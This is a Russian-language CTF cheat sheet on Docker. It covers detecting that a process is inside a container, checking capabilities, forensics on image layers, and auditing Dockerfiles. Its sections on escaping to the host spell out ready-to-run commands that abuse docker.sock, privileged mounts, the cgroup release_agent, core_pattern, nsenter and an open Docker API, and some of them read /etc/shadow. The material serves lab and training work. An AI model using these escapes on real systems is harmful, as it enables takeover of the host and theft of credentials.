# DOCKER — контейнеры в CTF: аудит, побег, форензика образа

Только свои стенды/CTF. Всё ниже — диагностика и известные техники, а не «взломай
чужой сервер».

---

## 0. Быстрый старт

```bash
bash linux/docker_audit.sh | tee docker.txt
python forensic/docker_image.py image.tar --out fs
python network/docker_api.py --host http://host:2375 --list
```

---

## 1. Я вообще в контейнере?

```bash
ls -la /.dockerenv
cat /proc/1/cgroup
hostname
cat /proc/self/mountinfo | head
```

Признаки: `/.dockerenv`, cgroup с `docker`/`kubepods`, короткий hostname (ID),
PID 1 — не systemd, а приложение.

Дополнительно:

```bash
cat /proc/1/comm
ps aux | head
ls -la /dev | head
```

---

## 2. Capabilities

```bash
capsh --print
grep Cap /proc/self/status
getpcaps $$
```

Расшифровать:

```bash
capsh --decode=0000003fffffffff
```

Опасно, если есть:

- `cap_sys_admin` — монтирование, побег через cgroup/core_pattern;
- `cap_sys_ptrace` — чтение памяти процессов хоста (если host PID);
- `cap_dac_read_search` — чтение любых файлов;
- `cap_net_raw`, `cap_net_admin` — сеть.

---

## 3. docker.sock — самый частый побег

```bash
ls -la /var/run/docker.sock /run/docker.sock
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock images
```

Если сокет доступен:

```bash
docker -H unix:///var/run/docker.sock run -it --rm -v /:/host alpine chroot /host sh
# или
docker -H unix:///var/run/docker.sock run -it --rm --privileged --pid=host alpine nsenter -t 1 -m -u -i -n -p -- sh
```

Внутри — `/host/root/flag`, `/host/etc/shadow` и т.д.

Если `docker` не установлен, можно дёргать API сокета:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/version
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

---

## 4. Privileged-контейнер

Проверка:

```bash
capsh --print | grep sys_admin
ls /dev/sd* /dev/vd* 2>/dev/null
```

Если privileged:

```bash
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host        # или vda1, nvme0n1p1
ls /mnt/host
cat /mnt/host/root/flag
```

Или смонтировать host root через уже смонтированный диск:

```bash
mount | grep ' / '
findmnt
```

---

## 5. cgroup v1 release_agent (cap_sys_admin)

Работает на cgroup v1 и старых ядрах.

```bash
mount | grep cgroup
ls /sys/fs/cgroup
```

Если есть записываемый cgroup и `release_agent`:

```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
printf '#!/bin/sh\ncat /root/flag > /tmp/out\n' > /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /tmp/out
```

(Пути подставь под свою систему; техника старая, но в CTF встречается.)

---

## 6. core_pattern (cap_sys_admin)

```bash
cat /proc/sys/kernel/core_pattern
```

Если можно записать:

```bash
echo '|/bin/sh -c "cat /root/flag > /tmp/out"' > /proc/sys/kernel/core_pattern
# спровоцировать падение процесса
```

---

## 7. Host PID namespace

Если контейнер запущен с `--pid=host`:

```bash
ls /proc | grep -E '^[0-9]+$' | wc -l   # много процессов = host
cat /proc/1/comm
```

Тогда:

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Или читать host-файлы через `/proc/1/root/...`.

---

## 8. Смонтированные host-пути

```bash
mount | grep -E 'host|rootfs|/mnt'
ls -la /host /mnt/host /rootfs
```

Если `/host` — это корень хоста:

```bash
cat /host/root/flag
chroot /host sh
```

---

## 9. Открытый Docker API (2375/2376)

```bash
curl http://host:2375/version
curl http://host:2375/containers/json?all=1
curl http://host:2375/images/json
```

Инструмент:

```bash
python network/docker_api.py --host http://host:2375 --list
python network/docker_api.py --host http://host:2375 --inspect <id>
python network/docker_api.py --host http://host:2375 --logs <id>
python network/docker_api.py --host http://host:2375 --exec <id> --cmd "cat /flag" --yes
```

`--exec` реально выполняет команду — только на своих стендах.

---

## 10. Форензика образа (docker save)

```bash
docker save app:latest -o image.tar
python forensic/docker_image.py image.tar --out fs
python forensic/docker_image.py image.tar --json
```

Что смотрит:

- `config.Env`, `Cmd`, `Entrypoint`, `User`, `Labels`;
- историю сборки (`created_by`) — там бывают пароли и URL;
- слои и whiteouts: файлы, которые «удалили» (`.wh.`), но они остались в слое;
- перезаписанные файлы — старая версия могла содержать секрет;
- секреты/флаги в env/history/файлах;
- распаковка итоговой ФС в `--out`.

Полезные команды без инструмента:

```bash
mkdir img && tar xf image.tar -C img
cat img/manifest.json
cat img/<config>.json | jq '.config.Env, .history[].created_by'
for l in img/*/layer.tar; do echo "== $l"; tar tf "$l" | head; done
```

Ищи `.wh.` (удалённое), `.env`, ключи, `id_rsa`, `credentials`, `config.json`.

---

## 11. Dockerfile

```bash
python forensic/docker_image.py Dockerfile --dockerfile
```

Проверяет: `FROM :latest`, `ADD http`, `curl | sh`, секреты в `ARG/ENV`,
`USER root`, `chmod 777`, `COPY . .`, отсутствие `USER`.

---

## 12. CTF-рецепты

| Симптом | Что делать |
|---|---|
| дан `image.tar` | `docker_image.py --out fs`, смотри whiteouts/history/env |
| дан Dockerfile | аудит, ищи секреты в ARG/ENV |
| есть `/var/run/docker.sock` | `docker run -v /:/host ... chroot /host` |
| privileged | смонтировать диск хоста |
| `--pid=host` | `nsenter -t 1 ...` |
| открыт 2375 | `docker_api.py --list`, inspect/env, exec |
| есть cgroup v1 + sys_admin | release_agent |
| флаг «удалён» из образа | смотри `.wh.` и старые слои |
| пароль в истории сборки | `history.created_by` в config |

---

## 13. Если ничего не сработало

1. Проверь `capsh --print` — может, есть неочевидная capability.
2. Проверь монтирования: `mount`, `findmnt`, `/proc/self/mountinfo`.
3. Проверь, есть ли host-пути: `/host`, `/mnt`, `/var/lib/docker`.
4. Проверь соседние контейнеры через сокет/API.
5. Проверь env и `/run/secrets`.
6. Проверь образ: слои и whiteouts.
7. Ядро/уязвимости: `uname -a`, runc/containerd CVE (только если разрешено).
